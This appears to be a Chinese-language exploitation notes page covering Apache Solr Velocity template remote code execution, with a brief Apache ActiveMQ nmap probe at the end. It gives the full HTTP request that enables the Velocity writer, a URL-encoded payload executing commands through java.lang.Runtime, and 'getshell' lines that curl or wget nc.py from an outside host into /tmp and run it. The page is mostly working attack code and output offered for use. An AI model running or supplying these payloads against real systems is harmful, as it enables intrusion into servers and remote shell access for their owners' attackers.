<h2 id="apache-solr-vuln">Apache-solr-vuln</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://192.168.137.181:8983/solr/admin/cores?indexInfo=false&amp;wt=json"</span>

<span class="o">{</span>
  <span class="s2">"responseHeader"</span>:<span class="o">{</span>
    <span class="s2">"status"</span>:0,
    <span class="s2">"QTime"</span>:0<span class="o">}</span>,
  <span class="s2">"initFailures"</span>:<span class="o">{}</span>,
  <span class="s2">"status"</span>:<span class="o">{</span>
    <span class="s2">"demo"</span>:<span class="o">{</span>
      <span class="s2">"name"</span>:<span class="s2">"demo"</span>,
      <span class="s2">"instanceDir"</span>:<span class="s2">"/var/solr/data/demo"</span>,
      <span class="s2">"dataDir"</span>:<span class="s2">"/var/solr/data/demo/data/"</span>,
      <span class="s2">"config"</span>:<span class="s2">"solrconfig.xml"</span>,
      <span class="s2">"schema"</span>:<span class="s2">"managed-schema"</span>,
      <span class="s2">"startTime"</span>:<span class="s2">"2020-08-22T01:42:03.422Z"</span>,
      <span class="s2">"uptime"</span>:51628
          <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>关键是这个<code class="language-plaintext highlighter-rouge">deomo:namel;instanceDir...</code>，修改数据包<code class="language-plaintext highlighter-rouge">Content-Type: application/json</code>，post数据修改内容：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /solr/demo/config HTTP/1.1
Host: 192.168.137.181:8983
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:79.0<span class="o">)</span> Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 259

<span class="o">{</span>
  <span class="s2">"update-queryresponsewriter"</span>: <span class="o">{</span>
    <span class="s2">"startup"</span>: <span class="s2">"lazy"</span>,
    <span class="s2">"name"</span>: <span class="s2">"velocity"</span>,
    <span class="s2">"class"</span>: <span class="s2">"solr.VelocityResponseWriter"</span>,
    <span class="s2">"template.base.dir"</span>: <span class="s2">""</span>,
    <span class="s2">"solr.resource.loader.enabled"</span>: <span class="s2">"true"</span>,
    <span class="s2">"params.resource.loader.enabled"</span>: <span class="s2">"true"</span>
  <span class="o">}</span>
<span class="o">}</span>
/////////////////////////////////////////////////////////////////////////////////////

反包：
HTTP/1.1 200 OK
Connection: close
Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 149

<span class="o">{</span>
  <span class="s2">"responseHeader"</span>:<span class="o">{</span>
    <span class="s2">"status"</span>:0,
    <span class="s2">"QTime"</span>:425<span class="o">}</span>,
  <span class="s2">"WARNING"</span>:<span class="s2">"This response format is experimental.  It is likely to change in the future."</span><span class="o">}</span>
</code></pre></div></div>
<p>rce payload:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>solr/bin4xin/select?wt<span class="o">=</span>velocity&amp;v.template<span class="o">=</span>custom&amp;v.template.custom<span class="o">=</span>%23set<span class="o">(</span><span class="nv">$x</span><span class="o">=</span>%27%27<span class="o">)</span>+%23set<span class="o">(</span><span class="nv">$rt</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.Runtime%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$chr</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.Character%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.String%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$ex</span><span class="o">=</span><span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27pwd%27<span class="o">))</span>+<span class="nv">$ex</span>.waitFor<span class="o">()</span>+%23set<span class="o">(</span><span class="nv">$out</span><span class="o">=</span><span class="nv">$ex</span>.getInputStream<span class="o">())</span>+%23foreach<span class="o">(</span><span class="nv">$i</span>+in+[1..<span class="nv">$out</span>.available<span class="o">()])</span><span class="nv">$str</span>.valueOf<span class="o">(</span><span class="nv">$chr</span>.toChars<span class="o">(</span><span class="nv">$out</span>.read<span class="o">()))</span>%23end
</code></pre></div></div>

<p>getshell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27curl%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py%27<span class="o">)</span>


wget%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py

<span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27python%20/tmp/nc.py%27<span class="o">)</span>
</code></pre></div></div>
<p>不过一般如果存在基本认证，就需要先过认证才行。</p>

<h2 id="apache-activemq-vuln">Apache ActiveMQ-vuln</h2>
<ul>
  <li>探测</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>39.99.161.182
Host is up <span class="o">(</span>0.095s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
8161/tcp open  http    Jetty 8.1.16.v20140903
|_http-server-header: Jetty<span class="o">(</span>8.1.16.v20140903<span class="o">)</span>
|_http-title: Apache ActiveMQ
</code></pre></div></div>
